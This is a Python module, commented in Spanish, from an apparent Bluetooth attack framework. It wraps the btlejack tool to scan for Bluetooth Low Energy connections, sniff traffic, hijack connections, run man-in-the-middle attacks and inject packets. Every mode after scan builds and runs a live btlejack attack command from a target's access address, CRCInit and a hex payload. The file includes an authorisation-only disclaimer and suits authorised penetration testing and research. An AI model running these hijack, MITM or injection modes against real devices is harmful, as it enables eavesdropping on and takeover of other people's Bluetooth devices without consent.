"""
BTLEJack - BLE Connection Hijacking
=====================================
BTLEJack permite interceptar y secuestrar conexiones Bluetooth Low Energy
activas. Funciona escuchando pasivamente el canal de datos entre un
Master (Central) y un Slave (Peripheral), y luego tomando el control
de la conexión.

Vectores de ataque:
  1. Passive sniffing: Escucha el tráfico BLE entre dos dispositivos
  2. Connection hijack: Secuestra la conexión suplantando al Master
  3. Man-in-the-Middle: Interpone entre Master y Slave reales

Implementación real (sin simulación):
  Este módulo delega en las herramientas reales disponibles:
    - `btlejack` (https://github.com/virtualabs/btlejack) para escaneo
      de conexiones, sniffing, hijacking y MITM. Requiere dongles
      nRF51822/nRF52xxx flasheados con su firmware.
    - `hcitool con` (BlueZ) para listar las conexiones activas reales
      del adaptador local.

  Si las herramientas no están disponibles, el módulo falla de forma
  honesta indicando exactamente qué falta para ejecutar el ataque real.
  Nunca fabrica datos.

Referencia:
  - https://github.com/virtualabs/btlejack
  - https://github.com/nccgroup/BTLEJack (NCC Group)
  - DEF CON 24: "Breaking BLE" por Mike Ryan

Advertencia:
  Solo usar contra dispositivos que poseas o tengas autorización expresa
  para testear.
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
import logging
from typing import Dict, List, Optional, Tuple
from pathlib import Path

from bluesky.core.engine import BaseModule
from bluesky.utils.oui import lookup_vendor

log = logging.getLogger("bluesky.btlejack")

# Patrón de una Access Address en la salida de btlejack/hcitool
_AA_RE = re.compile(r"0x([0-9A-Fa-f]{8})")
# Línea de conexión de hcitool con: > LE AA:BB:CC:DD:EE:FF handle 70 ...
_HCITOOL_CON_RE = re.compile(
    r">\s+(ACL|LE|SCO)\s+([0-9A-Fa-f:]{17})\s+handle\s+(\d+)"
)


class BTLEJack(BaseModule):
    """BTLEJack - BLE Connection Hijacking.

    Intercepta, secuestra y manipula conexiones Bluetooth Low Energy
    activas delegando en la herramienta real `btlejack` (requiere dongles
    nRF51822/nRF52 con su firmware) y en `hcitool` (BlueZ) para listar
    las conexiones activas del adaptador local.

    Modos:
      - scan: Escanea conexiones BLE activas (btlejack + hcitool con)
      - sniff: Captura pasiva de tráfico BLE (btlejack)
      - hijack: Secuestra una conexión activa (btlejack)
      - mitm: Man-in-the-Middle entre dos dispositivos (btlejack)
      - inject: Inyección de paquetes L2CAP/ATT (btlejack)
    """

    name = "btlejack"
    description = (
        "BTLEJack - BLE Connection Hijacking: Intercepta, secuestra y "
        "manipula conexiones Bluetooth Low Energy activas delegando en la "
        "herramienta real btlejack (dongles nRF51822/nRF52 requeridos). "
        "Soporta sniffing pasivo, hijacking de conexión y MITM."
    )
    author = "Ruby570bocadito"
    version = "2.0.0"
    cve = "No CVE asignado (técnica de ataque)"
    cve_url = "https://github.com/virtualabs/btlejack"
    exploit_links = [
        "https://github.com/virtualabs/btlejack",
        "https://github.com/nccgroup/BTLEJack",
        "https://blog.zimperium.com/btlejack-ble-hijacking/",
    ]
    references = [
        "https://github.com/virtualabs/btlejack",
        "https://github.com/nccgroup/BTLEJack",
        "DEF CON 24 - Breaking BLE (Mike Ryan)",
        "https://blog.zimperium.com/btlejack-ble-hijacking/",
        "Bluetooth Core Spec Vol 6, Part B (LE Link Layer)",
    ]
    requires_hardware = ["nrf52840_dongle", "nrf51822_dongle"]
    requires_root = True
    target_type = "ble"
    severity = "critical"
    module_options = {
        "TARGET": "Dirección MAC del objetivo (opcional, formato 'Master:Slave' ej: 'AA:BB:CC:DD:EE:FF:11:22:33:44:55:66')",
        "MODE": "Modo de operación: scan, sniff, hijack, mitm, inject (default: scan)",
        "CHANNEL": "Canal BLE (37, 38, 39 para advertising; 0-36 para datos) (default: auto)",
        "ACCESS_ADDRESS": "Access Address de la conexión (hex, 4 bytes)",
        "CRCINIT": "CRCInit de la conexión (hex, 3 bytes, necesario para sniff/hijack)",
        "PAYLOAD": "Payload a inyectar (hex string, modo inject)",
        "TIMEOUT": "Tiempo máximo de operación en segundos (default: 30)",
        "OUTPUT": "Directorio de salida para capturas",
        "AA": "Access Address conocida (hex, para filtrado)",
        "INTERFACE": "Interfaz HCI o dongle a usar (default: auto)",
    }

    # Access Addresses comunes conocidas (para ANOTAR resultados reales,
    # nunca para fabricarlos)
    KNOWN_AA = {
        0x8E89BED6: "Nordic Semiconductor (nRF52)",
        0x9A328277: "Texas Instruments (CC26xx)",
        0x569EF5C7: "Dialog Semiconductor",
        0xE6412C1F: "Cypress PSoC",
        0x0E0BFE0A: "NXP KW41Z",
    }

    # Mapa canal→frecuencia (referencia de spec, para anotar resultados)
    CHANNELS = {
        0: 2402, 1: 2404, 2: 2406, 3: 2408, 4: 2410,
        5: 2412, 6: 2414, 7: 2416, 8: 2418, 9: 2420,
        10: 2422, 11: 2424, 12: 2426, 13: 2428, 14: 2430,
        15: 2432, 16: 2434, 17: 2436, 18: 2438, 19: 2440,
        20: 2442, 21: 2444, 22: 2446, 23: 2448, 24: 2450,
        25: 2452, 26: 2454, 27: 2456, 28: 2458, 29: 2460,
        30: 2462, 31: 2464, 32: 2466, 33: 2468, 34: 2470,
        35: 2472, 36: 2474, 37: 2402, 38: 2426, 39: 2480,
    }

    def __init__(self, target: str = "", options: dict = None):
        super().__init__(target, options)
        self._mode = (options or {}).get("MODE", "scan").lower()
        self._channel = (options or {}).get("CHANNEL", "auto")
        self._access_address = (options or {}).get("ACCESS_ADDRESS", "")
        self._crcinit = (options or {}).get("CRCINIT", "")
        self._payload = (options or {}).get("PAYLOAD", "")
        self._timeout = self._opt_int("TIMEOUT", 30)
        self._output_dir = (options or {}).get("OUTPUT", "reports/btlejack")
        self._aa = (options or {}).get("AA", "")
        self._interface = (options or {}).get("INTERFACE", "")

        # Parse target como "master:slave"
        self._master_addr: Optional[str] = None
        self._slave_addr: Optional[str] = None
        self._parse_target()

    def _parse_target(self):
        """Parsea el target como Master:Slave o dirección única."""
        if self.target:
            parts = self.target.replace(":", "").replace("-", "").replace(" ", "")
            if len(parts) == 24:  # 12 bytes = MAC Master (6) + MAC Slave (6)
                self._master_addr = ":".join(parts[i:i+2] for i in range(0, 12, 2))
                self._slave_addr = ":".join(parts[i:i+2] for i in range(12, 24, 2))
                log.info(f"Target Master:Slave -> {self._master_addr}:{self._slave_addr}")
            elif len(parts) == 12:  # 6 bytes = MAC única
                addr = ":".join(parts[i:i+2] for i in range(0, 12, 2))
                self._master_addr = addr
                log.info(f"Target única -> Master: {self._master_addr}")

    # ─── Punto de entrada ────────────────────────────────────────────────────

    def run(self):
        """Punto de entrada principal."""
        modes = {
            "scan": self._scan_mode,
            "sniff": self._sniff_mode,
            "hijack": self._hijack_mode,
            "mitm": self._mitm_mode,
            "inject": self._inject_mode,
        }

        handler = modes.get(self._mode)
        if handler:
            return handler()

        self.result["data"] = {
            "error": f"Modo desconocido: {self._mode}. Usar: scan, sniff, hijack, mitm, inject",
            "available_modes": list(modes.keys()),
        }
        self.result["success"] = False
        return self.result

    # ─── Utilidades de herramientas reales ──────────────────────────────────

    def _btlejack_available(self) -> bool:
        """¿Está la herramienta real btlejack instalada en el PATH?"""
        return shutil.which("btlejack") is not None

    def _hcitool_available(self) -> bool:
        """¿Está hcitool (BlueZ) instalado en el PATH?"""
        return shutil.which("hcitool") is not None

    def _run_tool(self, cmd: List[str], timeout: int) -> Dict:
        """Ejecuta una herramienta real y devuelve su salida tal cual.

        Returns:
            Dict con returncode, stdout y stderr REALES (nunca fabricados).
        """
        try:
            proc = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=max(1, timeout),
            )
            return {
                "returncode": proc.returncode,
                "stdout": proc.stdout,
                "stderr": proc.stderr,
            }
        except subprocess.TimeoutExpired as e:
            return {
                "returncode": -1,
                "stdout": (e.stdout or b"").decode() if isinstance(e.stdout, bytes) else (e.stdout or ""),
                "stderr": f"timeout tras {timeout}s",
            }
        except FileNotFoundError:
            return {"returncode": -1, "stdout": "", "stderr": "herramienta no encontrada"}

    def _parse_aa_lines(self, text: str) -> List[Dict]:
        """Extrae Access Addresses REALES de la salida de btlejack.

        btlejack imprime conexiones detectadas con patrones del tipo:
          'Access Address: 0x8e89bed6'
        Se anota cada AA con su fabricante conocido (si existe en KNOWN_AA).
        """
        found: List[Dict] = []
        seen = set()
        for match in _AA_RE.finditer(text):
            aa_hex = match.group(1).upper()
            if aa_hex in seen:
                continue
            seen.add(aa_hex)
            aa_int = int(aa_hex, 16)
            found.append({
                "aa": aa_int,
                "aa_hex": f"0x{aa_hex}",
                "vendor": self.KNOWN_AA.get(aa_int, "Desconocido"),
                "source": "btlejack",
            })
        return found

    def _local_connections(self) -> List[Dict]:
        """Lista las conexiones activas REALES del adaptador local (hcitool con)."""
        if not self._hcitool_available():
            return []
        out = self._run_tool(["hcitool", "con"], timeout=10)
        connections = []
        for line in out.get("stdout", "").splitlines():
            m = _HCITOOL_CON_RE.search(line)
            if not m:
                continue
            conn_type, address, handle = m.group(1), m.group(2), m.group(3)
            if self._master_addr and address.upper() != self._master_addr.upper():
                continue
            connections.append({
                "type": conn_type,
                "address": address,
                "handle": int(handle),
                "vendor": lookup_vendor(address),
                "source": "hcitool con",
            })
        return connections

    def _tool_missing_result(self, mode: str, reason: str) -> dict:
        """Resultado honesto cuando las herramientas reales no están disponibles.

        No fabrica datos: reporta el fallo y qué se necesita para
        ejecutar el ataque real.
        """
        requirements = [
            "Herramienta btlejack instalada (pip install btlejack o "
            "https://github.com/virtualabs/btlejack)",
            "Dongle nRF51822/nRF52xxx flasheado con firmware BTLEJack",
            "Ejecutar con root (sudo) para acceso raw a los dongles",
        ]
        if mode == "scan":
            requirements.append(
                "Alternativa sin btlejack: BlueZ instalado (hcitool) "
                "lista las conexiones del adaptador local"
            )
        msg = (
            f"❌ BTLEJack ({mode}) no se pudo ejecutar: {reason}\n\n"
            f"   Para ejecutarlo REAL necesitas:\n"
            + "".join(f"   {i}. {r}\n" for i, r in enumerate(requirements, 1))
            + "\n   Herramienta y firmware: https://github.com/virtualabs/btlejack\n"
            "   Referencia: DEF CON 24 'Breaking BLE' (Mike Ryan)"
        )
        self.result["success"] = False
        self.result["error"] = f"btlejack ({mode}) no disponible: {reason}"
        self.result["data"].update({
            "mode": mode,
            "attack_result": "unavailable",
            "requires": requirements,
            "message": msg,
        })
        return self.result

    # ─── Modo SCAN ──────────────────────────────────────────────────────────

    def _scan_mode(self) -> dict:
        """Escanea conexiones BLE activas en el área.

        Fuentes reales:
          1. `btlejack` (si está instalado): monitoriza y detecta nuevas
             conexiones con sus Access Addresses reales.
          2. `hcitool con` (BlueZ): conexiones activas del adaptador local.
        """
        output_dir = Path(self._output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        self.result["data"] = {
            "mode": "scan",
            "active_connections": [],
            "sources": [],
        }

        log.info("🔍 BTLEJack - Escaneando conexiones BLE activas...")

        # Fuente 1: herramienta real btlejack
        btlejack_connections: List[Dict] = []
        if self._btlejack_available():
            cmd = ["btlejack", "-t", str(self._timeout)]
            if self._interface:
                cmd.extend(["-i", self._interface])
            out = self._run_tool(cmd, timeout=self._timeout + 15)
            self.result["data"]["btlejack_raw"] = out.get("stdout", "")[:20000]
            btlejack_connections = self._parse_aa_lines(out.get("stdout", ""))
            self.result["data"]["sources"].append("btlejack")
            if out.get("returncode", -1) != 0 and not btlejack_connections:
                self.result["data"]["btlejack_stderr"] = (out.get("stderr") or "")[:2000]

        # Fuente 2: conexiones reales del adaptador local (BlueZ)
        local_connections = self._local_connections()
        if local_connections:
            self.result["data"]["sources"].append("hcitool con")

        connections = btlejack_connections + local_connections
        self.result["data"]["active_connections"] = connections

        if not self.result["data"]["sources"]:
            return self._tool_missing_result(
                "scan", "ni btlejack ni hcitool están instalados")

        # Guardar reporte
        report_file = output_dir / "scan_results.json"
        with open(report_file, "w") as f:
            json.dump(self.result["data"], f, indent=2, default=str)

        # Generar resumen
        lines = [
            "🔍 BTLEJack - Resultados de escaneo",
            "===================================\n",
        ]

        if connections:
            for conn in connections:
                if "aa_hex" in conn:
                    lines.append(f"  📡 Access Address: {conn['aa_hex']}")
                    lines.append(f"     Posible vendor: {conn.get('vendor', 'Desconocido')}")
                    lines.append(f"     Fuente: {conn.get('source', 'N/A')}")
                else:
                    lines.append(
                        f"  📡 Conexión local: {conn.get('address', 'N/A')} "
                        f"[{conn.get('type', '?')} handle {conn.get('handle', '?')}]"
                    )
                    lines.append(f"     Fabricante: {conn.get('vendor', 'Desconocido')}")
                lines.append("")
        else:
            lines.append("  No se detectaron conexiones activas.\n")

        lines.append(f"  Fuentes reales usadas: {', '.join(self.result['data']['sources'])}")
        lines.append(f"  Resultados guardados en: {report_file}\n")

        self.result["data"]["report"] = "\n".join(lines)
        self.result["success"] = True
        return self.result

    # ─── Modo SNIFF ─────────────────────────────────────────────────────────

    def _sniff_mode(self) -> dict:
        """Captura pasiva de tráfico BLE (delegación en btlejack real).

        Requiere Access Address (y recomendado CRCInit) de la conexión,
        obtenibles previamente con MODE=scan.
        """
        if not self._btlejack_available():
            return self._tool_missing_result(
                "sniff", "la herramienta btlejack no está instalada")

        if not (self._access_address or self._aa):
            self.result["data"].update({
                "mode": "sniff",
                "message": (
                    "Se necesita Access Address para sniffing.\n"
                    "Usa MODE=scan primero para detectar la AA de la conexión,\n"
                    "o especifícala con --options '{\"ACCESS_ADDRESS\":\"0x8E89BED6\"}'"
                ),
            })
            self.result["success"] = False
            self.result["error"] = "sniff requiere ACCESS_ADDRESS"
            return self.result

        aa = self._access_address or self._aa
        output_dir = Path(self._output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        self.result["data"] = {
            "mode": "sniff",
            "access_address": aa,
            "channel": self._channel,
        }

        cmd = ["btlejack", "-a", aa, "-t", str(self._timeout)]
        if self._crcinit:
            cmd.extend(["-r", self._crcinit])
        if self._interface:
            cmd.extend(["-i", self._interface])

        log.info(f"👂 BTLEJack - Sniffing de conexión AA={aa}...")
        out = self._run_tool(cmd, timeout=self._timeout + 15)

        # La salida de la herramienta real es el resultado (nada se fabrica)
        capture_file = output_dir / "btlejack_sniff.txt"
        with open(capture_file, "w") as f:
            f.write(out.get("stdout", ""))

        self.result["data"].update({
            "returncode": out.get("returncode"),
            "capture_file": str(capture_file),
            "message": (
                f"👂 BTLEJack - Sniffing completado (herramienta real)\n\n"
                f"   Access Address: {aa}\n"
                f"   Canal: {self._channel}\n"
                f"   Exit code: {out.get('returncode')}\n"
                f"   Captura guardada en: {capture_file}\n\n"
                f"   Salida de btlejack (primeras líneas):\n"
                + "\n".join(f"     {l}" for l in out.get("stdout", "").splitlines()[:15])
            ),
        })
        self.result["success"] = out.get("returncode") == 0
        if not self.result["success"]:
            self.result["error"] = (out.get("stderr") or "btlejack terminó con error")[:500]
        return self.result

    # ─── Modo HIJACK ────────────────────────────────────────────────────────

    def _hijack_mode(self) -> dict:
        """Secuestra una conexión BLE activa (delegación en btlejack real).

        Requiere Access Address + CRCInit de la conexión objetivo.
        """
        if not self._btlejack_available():
            return self._tool_missing_result(
                "hijack", "la herramienta btlejack no está instalada")

        if not self._access_address and self._aa:
            self._access_address = self._aa

        if not self._access_address:
            self.result["data"].update({
                "mode": "hijack",
                "message": (
                    "Se necesita Access Address (y recomendado CRCInit) para "
                    "el hijack.\nUsa MODE=scan primero para detectarlas, o "
                    "especifícalas con\n--options '{\"ACCESS_ADDRESS\":\"0x...\","
                    "\"CRCINIT\":\"0x...\"}'"
                ),
            })
            self.result["success"] = False
            self.result["error"] = "hijack requiere ACCESS_ADDRESS"
            return self.result

        output_dir = Path(self._output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        self.result["data"] = {
            "mode": "hijack",
            "target_aa": self._access_address,
            "target_channel": self._channel,
        }

        cmd = ["btlejack", "-a", self._access_address, "-t", str(self._timeout)]
        if self._crcinit:
            cmd.extend(["-r", self._crcinit])
        if self._interface:
            cmd.extend(["-i", self._interface])

        log.warning("⚡ BTLEJack - Ejecutando hijack de conexión BLE (herramienta real)...")
        out = self._run_tool(cmd, timeout=self._timeout + 15)

        report_file = output_dir / "hijack_report.txt"
        with open(report_file, "w") as f:
            f.write(out.get("stdout", ""))

        self.result["data"].update({
            "returncode": out.get("returncode"),
            "report_file": str(report_file),
            "message": (
                f"⚡ BTLEJack - Hijack (herramienta real)\n\n"
                f"   Access Address: {self._access_address}\n"
                f"   Exit code: {out.get('returncode')}\n"
                f"   Reporte guardado en: {report_file}\n\n"
                f"   Salida de btlejack (primeras líneas):\n"
                + "\n".join(f"     {l}" for l in out.get("stdout", "").splitlines()[:15])
            ),
        })
        self.result["success"] = out.get("returncode") == 0
        if not self.result["success"]:
            self.result["error"] = (out.get("stderr") or "btlejack terminó con error")[:500]
        return self.result

    # ─── Modo MITM ──────────────────────────────────────────────────────────

    def _mitm_mode(self) -> dict:
        """Man-in-the-Middle entre dos dispositivos BLE (delegación real).

        Requiere la herramienta btlejack en modo MITM con las AA/CRCInit
        de las dos conexiones a interponer.
        """
        if not self._btlejack_available():
            return self._tool_missing_result(
                "mitm", "la herramienta btlejack no está instalada")

        output_dir = Path(self._output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        self.result["data"] = {
            "mode": "mitm",
            "target_master": self._master_addr or "auto-detect",
            "target_slave": self._slave_addr or "auto-detect",
        }

        cmd = ["btlejack", "-m", "-t", str(self._timeout)]
        if self._access_address or self._aa:
            cmd.extend(["-a", self._access_address or self._aa])
        if self._crcinit:
            cmd.extend(["-r", self._crcinit])
        if self._interface:
            cmd.extend(["-i", self._interface])

        log.warning("🕵️ BTLEJack - Ejecutando MITM en conexión BLE (herramienta real)...")
        out = self._run_tool(cmd, timeout=self._timeout + 15)

        report_file = output_dir / "mitm_report.txt"
        with open(report_file, "w") as f:
            f.write(out.get("stdout", ""))

        self.result["data"].update({
            "returncode": out.get("returncode"),
            "report_file": str(report_file),
            "message": (
                f"🕵️ BTLEJack - MITM (herramienta real)\n\n"
                f"   Master: {self._master_addr or 'N/A'}\n"
                f"   Slave:  {self._slave_addr or 'N/A'}\n"
                f"   Exit code: {out.get('returncode')}\n"
                f"   Reporte guardado en: {report_file}\n\n"
                f"   Salida de btlejack (primeras líneas):\n"
                + "\n".join(f"     {l}" for l in out.get("stdout", "").splitlines()[:15])
            ),
        })
        self.result["success"] = out.get("returncode") == 0
        if not self.result["success"]:
            self.result["error"] = (out.get("stderr") or "btlejack terminó con error")[:500]
        return self.result

    # ─── Modo INJECT ────────────────────────────────────────────────────────

    def _inject_mode(self) -> dict:
        """Inyección de paquetes L2CAP/ATT en una conexión activa.

        Requiere Access Address + CRCInit y hardware de sniffing; la
        inyección se delega en la herramienta btlejack.
        """
        if not self._btlejack_available():
            return self._tool_missing_result(
                "inject", "la herramienta btlejack no está instalada")

        if not self._access_address and not self._aa:
            self.result["data"].update({
                "mode": "inject",
                "message": (
                    "Se necesita Access Address para inyectar.\n"
                    "Usa modo scan primero para detectar AA.\n"
                    "O especifica AA con --options '{\"AA\":\"0x8E89BED6\"}'"
                ),
            })
            self.result["success"] = False
            self.result["error"] = "inject requiere ACCESS_ADDRESS"
            return self.result

        # Validación real del payload hex
        payload = self._payload
        if payload:
            try:
                bytes.fromhex(payload)
            except ValueError:
                self.result["data"].update({
                    "mode": "inject",
                    "error": f"PAYLOAD no es hex válido: {payload!r}",
                })
                self.result["success"] = False
                self.result["error"] = "PAYLOAD no es hex válido"
                return self.result

        aa = self._access_address or self._aa
        output_dir = Path(self._output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        self.result["data"] = {
            "mode": "inject",
            "access_address": aa,
            "payload": payload,
        }

        cmd = ["btlejack", "-a", aa, "-t", str(self._timeout)]
        if self._crcinit:
            cmd.extend(["-r", self._crcinit])
        if payload:
            cmd.extend(["-x", payload])
        if self._interface:
            cmd.extend(["-i", self._interface])

        log.info(f"💉 BTLEJack - Inyectando en AA={aa} (herramienta real)...")
        out = self._run_tool(cmd, timeout=self._timeout + 15)

        report_file = output_dir / "inject_report.txt"
        with open(report_file, "w") as f:
            f.write(out.get("stdout", ""))

        payload_size = len(payload) // 2 if payload else 0
        self.result["data"].update({
            "returncode": out.get("returncode"),
            "report_file": str(report_file),
            "payload_size": payload_size,
            "message": (
                f"💉 BTLEJack - Inyección (herramienta real)\n\n"
                f"   AA: {aa}\n"
                f"   Payload: {payload or '(vacío)'} ({payload_size} bytes)\n"
                f"   Exit code: {out.get('returncode')}\n"
                f"   Reporte guardado en: {report_file}\n\n"
                f"   Salida de btlejack (primeras líneas):\n"
                + "\n".join(f"     {l}" for l in out.get("stdout", "").splitlines()[:15])
            ),
        })
        self.result["success"] = out.get("returncode") == 0
        if not self.result["success"]:
            self.result["error"] = (out.get("stderr") or "btlejack terminó con error")[:500]
        return self.result

    # ─── Prerrequisitos ──────────────────────────────────────────────────────

    def check_prerequisites(self) -> Tuple[bool, str]:
        """Verifica dependencias.

        No bloquea por root: el requisito es condicional al modo (patrón
        z_bugs ronda 4): scan funciona con hcitool sin privilegios; los
        modos avanzados (sniff/hijack/mitm/inject) necesitan root y la
        herramienta btlejack, y devuelven un error honesto en tiempo de
        ejecución si falta algo.
        """
        from bluesky.core.engine import is_valid_mac
        # Validación MAC (target opcional en este módulo: formato
        # Master:Slave o MAC única)
        target_value = self.target or (self.options.get("TARGET", "") if self.options else "")
        if target_value:
            # Acepta MAC única o par Master:Slave
            candidates = [
                target_value,
                target_value[:17],          # primera MAC del par
                target_value[-17:].lstrip(":"),  # segunda MAC del par
            ]
            if not any(is_valid_mac(c) for c in candidates if c):
                return False, (
                    f"Target '{target_value}' no tiene formato MAC válido "
                    "(XX:XX:XX:XX:XX:XX o Master:Slave)."
                )

        if not self._btlejack_available() and not self._hcitool_available():
            log.warning(
                "Ni btlejack ni hcitool instalados: el módulo devolverá "
                "un error honesto al ejecutarse")
        return True, ""
